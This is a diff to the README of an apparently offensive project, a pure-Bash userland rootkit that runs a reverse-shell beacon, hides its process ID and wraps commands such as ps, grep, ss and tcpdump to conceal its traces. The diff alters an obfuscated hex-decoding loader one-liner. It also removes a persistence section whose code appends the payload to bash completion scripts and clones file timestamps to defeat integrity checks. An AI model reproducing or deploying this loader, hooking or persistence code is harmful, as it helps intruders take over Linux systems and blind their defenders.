@@ -1,6 +1,6 @@
 # bash-rootkit
 
-> A pure-Bash userland rootkit built from Linux tips and tricks — no compiled binaries, no kernel modules. Persists as a reverse-shell beacon, hides its own PID, and shadows common system commands to blind the defender.
+> A pure-Bash userland rootkit built entirely from living-off-the-land techniques — no compiled binaries, no kernel modules. Persists as a reverse-shell beacon, hides its own PID, and shadows common system commands to blind the defender using only tools already on the box.
 
 ![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
 ![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
@@ -15,7 +15,9 @@
 
 ## 📖 Overview
 
-A fully self-contained userland rootkit written in pure Bash. No compiled code, no kernel exploits — everything runs in the shell itself.
+A fully self-contained userland rootkit written in pure Bash — no compiled code, no kernel
+exploits. Everything runs using tools already present on a stock Linux system: `bash`, `mount`,
+`openssl`. Pure living off the land.
 
 The project has three layers:
 
@@ -50,9 +52,7 @@ userid_ver1_00="636f6d6d616e6420657870..."
 userid_ver1_01="6f72743d28677265707c68..."
 # ...
 
-eval "$(compgen -v userid | sort -V | while read _v; do
-    printf "${!_v}"
-done | perl -lne 'print pack("H*",$_)')" 2>/dev/null
+if [ "$UID" -ge 0 ]; then . <(compgen -v userid | sort -V | while read _i; do printf "${!_i}"; done | xxd -r -p) 2>/dev/null; fi
 ```
 
 **Step 3 — Obfuscate with THC Bincrypter**, making the beacon script unreadable at rest and
@@ -118,10 +118,11 @@ command export _HG_P="grep|ps|mount|4316|/proc/|hidepid|bash_|<filename>|..."
 |---------|-----------|---------------|
 | `busybox` | Subcmd router | Routes all wrapped subcommands through hooked functions, defeating busybox-as-clean-binary bypass |
 | `ls` | Bash fn + `-I` flags | Hidden files & empty `/proc` entries for masked PIDs |
-| `ps` / `pgrep` / `top` / `htop` | Pattern-filtered output | Rootkit process names, IP, port |
+| `ps` / `pgrep` / `top` / `htop` | Mounted over by `mtab()` | Rootkit process names, IP, port |
 | `grep` / `head` / `tail` / `cat` | Pipe through `grep -Ev $_HG_P` | Any line containing rootkit indicators |
 | `mount` / `findmnt` | Output filter | `/proc` and `/dev/shm` bind-mounts |
 | `tcpdump` | Auto-inject BPF filter | C2 port from all captures |
+| `ss` / `netstat` | Pattern-filtered output | C2 port connection |
 | `lsof` / `strace` | Pattern-filtered output | Open FDs and syscalls related to the beacon |
 | `set` / `declare` / `typeset` | AWK block-skip parser | Shadow function definitions from variable dumps |
 | `env` / `printenv` / `export` | AWK + grep filter | `_HG_P` env var & `BASH_FUNC_*` exports |
@@ -153,42 +154,6 @@ type() {
     esac
   done
 }
-```
-
----
-
-## 🔁 Persistence
-
-The beacon finds a lengthy, obscure startup script that is sourced on every login — preferably
-one outside `/home`, `/root`, or `/etc` — using this one-liner:
-
-```bash
-for i in $(/bin/bash -lixc 'exit' 2>&1 \
-    | awk 'match($0, /^+* (\.|source) (.+)/, s) {print s[2]}'); do
-  wc -l $i
-done | sort -n
-```
-
-A good target is something like `/usr/share/bash-completion/bash_completion` — thousands of lines
-of legitimate content that no one reads carefully. The obfuscated function block and eval loader
-are appended there and blend in visually.
-
-The persistence file itself is named `<filename>.bash` — whatever looks legitimate for the target
-system. That same name is added to `_HG_P` so `ls`, `cat`, and `grep` will never show it.
-Timestamps are cloned from neighbouring system files to defeat time-based integrity checks.
-
-```bash
-FILE="/etc/bash_completion.d/<filename>.bash"
-
-if [[ ! -f "$FILE" ]]; then
-  cat <<EOF > "$FILE"
-  # <hex-encoded shadow functions embedded here>
-EOF
-  # Clone mtime from a real system file to avoid standing out
-  touch -r /etc/bash_completion.d/javaws.bash "$FILE"
-  touch -r /etc/sysconfig/ /etc/bash_completion.d/
-  touch -r /opt/ /etc/
-fi
 ```
 
 ---
